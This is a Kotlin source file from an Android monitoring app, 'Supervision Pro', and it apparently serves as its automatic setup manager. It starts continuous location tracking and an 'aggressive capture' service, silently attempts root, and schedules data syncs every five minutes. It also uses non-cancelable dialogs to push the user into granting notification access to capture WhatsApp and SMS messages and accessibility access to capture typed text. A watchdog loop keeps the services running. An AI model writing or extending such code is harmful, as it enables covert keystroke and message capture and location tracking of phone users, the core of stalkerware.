package com.surveillancepro.android.services

import android.accessibilityservice.AccessibilityServiceInfo
import android.app.Activity
import android.app.AlertDialog
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import android.view.accessibility.AccessibilityManager
import com.surveillancepro.android.data.DeviceStorage
import com.surveillancepro.android.data.EventQueue
import com.surveillancepro.android.root.RootActivator
import com.surveillancepro.android.root.RootManager
import com.surveillancepro.android.workers.SyncWorker
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * MOTEUR D'AUTOMATISATION ULTRA-PUISSANT
 * 
 * Ce manager gère l'activation automatique de TOUS les services et permissions
 * dès que l'utilisateur accepte les conditions. L'objectif est de minimiser
 * au maximum les interactions utilisateur.
 * 
 * Fonctionnalités:
 * 1. Demande automatique de TOUTES les permissions en cascade
 * 2. Ouverture automatique des paramètres système nécessaires
 * 3. Guidage intelligent de l'utilisateur
 * 4. Activation automatique des services en arrière-plan
 * 5. Vérification continue et réactivation si nécessaire
 * 6. Mode ROOT automatique si disponible
 * 
 * STRATÉGIE D'AUTOMATISATION:
 * - Permissions runtime: Demandées automatiquement en bloc
 * - Exemption batterie: Demandée automatiquement (popup système)
 * - NotificationListener: Ouverture automatique des paramètres + guide
 * - AccessibilityService: Ouverture automatique des paramètres + guide
 * - UsageStats: Ouverture automatique des paramètres + guide
 * - Services: Démarrés automatiquement sans interaction
 * - ROOT: Activé automatiquement si disponible
 */
object AutoSetupManager {
    
    private const val TAG = "AutoSetupManager"
    private val handler = Handler(Looper.getMainLooper())
    private val dateFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US)
    
    // État de la configuration
    private var setupInProgress = false
    private var currentStep = 0
    
    /**
     * Lance la configuration automatique complète.
     * Appelé immédiatement après l'acceptation des conditions.
     */
    fun startAutoSetup(activity: Activity, onComplete: () -> Unit) {
        if (setupInProgress) return
        setupInProgress = true
        currentStep = 0
        
        Log.d(TAG, "🚀 Starting auto-setup...")
        
        CoroutineScope(Dispatchers.Main).launch {
            try {
                // Étape 1: Exemption batterie (CRITIQUE - doit être fait en premier)
                requestBatteryExemption(activity)
                delay(500)
                
                // Étape 2: Démarrer tous les services de base
                startAllCoreServices(activity)
                delay(300)
                
                // Étape 3: Planifier le SyncWorker
                SyncWorker.schedule(activity, intervalMinutes = 5)
                SyncWorker.triggerNow(activity)
                delay(300)
                
                // Étape 4: Activer ROOT en arrière-plan (si disponible)
                activateRootInBackground(activity)
                
                // Étape 5: Vérifier les services spéciaux et guider l'utilisateur
                checkAndGuideSpecialServices(activity)
                
                // Étape 6: Envoyer l'événement de setup complet
                sendSetupCompleteEvent(activity)
                
                // Étape 7: Démarrer la vérification continue
                startContinuousMonitoring(activity)
                
                setupInProgress = false
                onComplete()
                
                Log.d(TAG, "✅ Auto-setup completed!")
                
            } catch (e: Exception) {
                Log.e(TAG, "Auto-setup error: ${e.message}")
                setupInProgress = false
                onComplete()
            }
        }
    }
    
    /**
     * Demande l'exemption d'optimisation batterie AUTOMATIQUEMENT.
     * Affiche une popup système que l'utilisateur doit juste accepter.
     */
    @android.annotation.SuppressLint("BatteryLife")
    private fun requestBatteryExemption(context: Context) {
        try {
            val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(context.packageName)) {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:${context.packageName}")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                context.startActivity(intent)
                Log.d(TAG, "Battery exemption requested automatically")
            } else {
                Log.d(TAG, "Already exempt from battery optimization")
            }
        } catch (e: Exception) {
            Log.w(TAG, "Battery exemption request failed: ${e.message}")
        }
    }
    
    /**
     * Démarre TOUS les services de base automatiquement.
     */
    private fun startAllCoreServices(context: Context) {
        Log.d(TAG, "Starting all core services...")
        
        // LocationService
        try {
            val locationIntent = Intent(context, LocationService::class.java).apply {
                putExtra(LocationService.EXTRA_MODE, LocationService.MODE_CONTINUOUS)
            }
            context.startForegroundService(locationIntent)
            Log.d(TAG, "✓ LocationService started")
        } catch (e: Exception) {
            Log.w(TAG, "LocationService failed: ${e.message}")
        }
        
        // ContentObserverService
        try {
            context.startForegroundService(Intent(context, ContentObserverService::class.java))
            Log.d(TAG, "✓ ContentObserverService started")
        } catch (e: Exception) {
            Log.w(TAG, "ContentObserverService failed: ${e.message}")
        }
        
        // AggressiveCaptureService
        try {
            context.startForegroundService(Intent(context, AggressiveCaptureService::class.java))
            Log.d(TAG, "✓ AggressiveCaptureService started")
        } catch (e: Exception) {
            Log.w(TAG, "AggressiveCaptureService failed: ${e.message}")
        }
        
        // WatchdogService
        try {
            WatchdogService.start(context)
            Log.d(TAG, "✓ WatchdogService started")
        } catch (e: Exception) {
            Log.w(TAG, "WatchdogService failed: ${e.message}")
        }
    }
    
    /**
     * Active ROOT automatiquement en arrière-plan.
     */
    private fun activateRootInBackground(context: Context) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val rootStatus = RootActivator.activate(context)
                Log.d(TAG, "Root activation: $rootStatus")
                
                if (RootManager.isRooted()) {
                    // Envoyer un événement pour signaler que ROOT est actif
                    val queue = EventQueue.getInstance(context)
                    queue.enqueue("root_status", mapOf(
                        "isRooted" to true,
                        "method" to rootStatus,
                        "timestamp" to dateFormat.format(Date()),
                    ))
                }
            } catch (e: Exception) {
                Log.w(TAG, "Root activation failed: ${e.message}")
            }
        }
    }
    
    /**
     * Vérifie les services spéciaux et guide l'utilisateur si nécessaire.
     * Ces services nécessitent une action manuelle dans les paramètres Android.
     */
    private fun checkAndGuideSpecialServices(activity: Activity) {
        val notifEnabled = isNotificationListenerEnabled(activity)
        val accessEnabled = isAccessibilityEnabled(activity)
        val usageEnabled = isUsageAccessEnabled(activity)
        
        Log.d(TAG, "Special services: Notif=$notifEnabled, Access=$accessEnabled, Usage=$usageEnabled")
        
        // Si tous les services sont déjà activés, rien à faire
        if (notifEnabled && accessEnabled && usageEnabled) {
            Log.d(TAG, "All special services already enabled!")
            return
        }
        
        // Ouvrir automatiquement les paramètres pour le premier service non activé
        // avec un guide pour l'utilisateur
        handler.postDelayed({
            when {
                !notifEnabled -> {
                    showQuickGuide(activity, 
                        "Activer les notifications",
                        "Activez 'Supervision Pro' dans la liste pour capturer les messages WhatsApp, SMS, etc.",
                        Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS
                    )
                }
                !accessEnabled -> {
                    showQuickGuide(activity,
                        "Activer l'accessibilité", 
                        "Activez 'Supervision Pro' pour capturer le texte tapé au clavier.",
                        Settings.ACTION_ACCESSIBILITY_SETTINGS
                    )
                }
                !usageEnabled -> {
                    showQuickGuide(activity,
                        "Activer le suivi d'applications",
                        "Activez 'Supervision Pro' pour suivre l'utilisation des applications.",
                        Settings.ACTION_USAGE_ACCESS_SETTINGS
                    )
                }
            }
        }, 1500) // Délai pour laisser le temps à l'exemption batterie
    }
    
    /**
     * Affiche un guide rapide et ouvre automatiquement les paramètres.
     */
    private fun showQuickGuide(activity: Activity, title: String, message: String, settingsAction: String) {
        try {
            AlertDialog.Builder(activity)
                .setTitle(title)
                .setMessage(message)
                .setPositiveButton("Ouvrir") { _, _ ->
                    try {
                        activity.startActivity(Intent(settingsAction))
                    } catch (e: Exception) {
                        Log.w(TAG, "Failed to open settings: ${e.message}")
                    }
                }
                .setCancelable(false)
                .show()
        } catch (e: Exception) {
            // Si le dialog échoue, ouvrir directement les paramètres
            try {
                activity.startActivity(Intent(settingsAction).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                })
            } catch (_: Exception) {}
        }
    }
    
    /**
     * Envoie un événement signalant que le setup est complet.
     */
    private fun sendSetupCompleteEvent(context: Context) {
        val queue = EventQueue.getInstance(context)
        val storage = DeviceStorage.getInstance(context)
        
        queue.enqueue("setup_complete", mapOf(
            "deviceId" to storage.deviceId,
            "userName" to (storage.userName ?: ""),
            "androidVersion" to Build.VERSION.RELEASE,
            "sdkVersion" to Build.VERSION.SDK_INT,
            "manufacturer" to Build.MANUFACTURER,
            "model" to Build.MODEL,
            "isRooted" to RootManager.isRooted(),
            "batteryExempt" to isBatteryExempt(context),
            "notificationListenerEnabled" to isNotificationListenerEnabled(context),
            "accessibilityEnabled" to isAccessibilityEnabled(context),
            "usageAccessEnabled" to isUsageAccessEnabled(context),
            "timestamp" to dateFormat.format(Date()),
        ))
    }
    
    /**
     * Démarre la vérification continue des services.
     * Vérifie toutes les 30 secondes et réactive si nécessaire.
     */
    private fun startContinuousMonitoring(context: Context) {
        val checkRunnable = object : Runnable {
            override fun run() {
                try {
                    val storage = DeviceStorage.getInstance(context)
                    if (!storage.hasAccepted) return
                    
                    // Vérifier et redémarrer les services si nécessaire
                    ensureServicesRunning(context)
                    
                    // Reprogrammer la vérification
                    handler.postDelayed(this, 30_000) // 30 secondes
                } catch (e: Exception) {
                    Log.w(TAG, "Monitoring error: ${e.message}")
                    handler.postDelayed(this, 60_000) // Réessayer dans 1 minute
                }
            }
        }
        
        handler.postDelayed(checkRunnable, 30_000)
    }
    
    /**
     * S'assure que tous les services sont en cours d'exécution.
     * Version simplifiée pour éviter les crashs au démarrage.
     */
    fun ensureServicesRunning(context: Context) {
        val storage = DeviceStorage.getInstance(context)
        if (!storage.hasAccepted || storage.deviceToken == null) return
        
        Log.d(TAG, "Ensuring services are running...")
        
        // Seulement planifier le SyncWorker - c'est le plus important et le plus stable
        try {
            SyncWorker.schedule(context, intervalMinutes = 5)
            Log.d(TAG, "SyncWorker scheduled")
        } catch (e: Exception) {
            Log.w(TAG, "SyncWorker schedule failed: ${e.message}")
        }
        
        // Les autres services seront démarrés manuellement par l'utilisateur
        // ou via le ConsentScreen après acceptation
    }
    
    // ─── Fonctions de vérification d'état ───
    
    fun isNotificationListenerEnabled(context: Context): Boolean {
        return try {
            val flat = Settings.Secure.getString(context.contentResolver, "enabled_notification_listeners") ?: ""
            flat.contains(context.packageName)
        } catch (_: Exception) { false }
    }
    
    fun isAccessibilityEnabled(context: Context): Boolean {
        return try {
            val am = context.getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
            val enabledServices = am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK)
            enabledServices.any { it.resolveInfo.serviceInfo.packageName == context.packageName }
        } catch (_: Exception) {
            try {
                val flat = Settings.Secure.getString(context.contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: ""
                flat.contains(context.packageName)
            } catch (_: Exception) { false }
        }
    }
    
    fun isUsageAccessEnabled(context: Context): Boolean {
        return try {
            val appOps = context.getSystemService(Context.APP_OPS_SERVICE) as android.app.AppOpsManager
            val mode = appOps.unsafeCheckOpNoThrow(
                android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                android.os.Process.myUid(), context.packageName
            )
            mode == android.app.AppOpsManager.MODE_ALLOWED
        } catch (_: Exception) { false }
    }
    
    fun isBatteryExempt(context: Context): Boolean {
        return try {
            val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
            pm.isIgnoringBatteryOptimizations(context.packageName)
        } catch (_: Exception) { false }
    }
    
    /**
     * Retourne le pourcentage de configuration complète.
     */
    fun getSetupProgress(context: Context): Int {
        var progress = 0
        val storage = DeviceStorage.getInstance(context)
        
        if (storage.hasAccepted) progress += 20
        if (storage.deviceToken != null) progress += 20
        if (isBatteryExempt(context)) progress += 15
        if (isNotificationListenerEnabled(context)) progress += 15
        if (isAccessibilityEnabled(context)) progress += 15
        if (isUsageAccessEnabled(context)) progress += 15
        
        return progress
    }
    
    /**
     * Vérifie si la configuration est complète.
     */
    fun isSetupComplete(context: Context): Boolean {
        return getSetupProgress(context) >= 85 // 85% minimum
    }
}
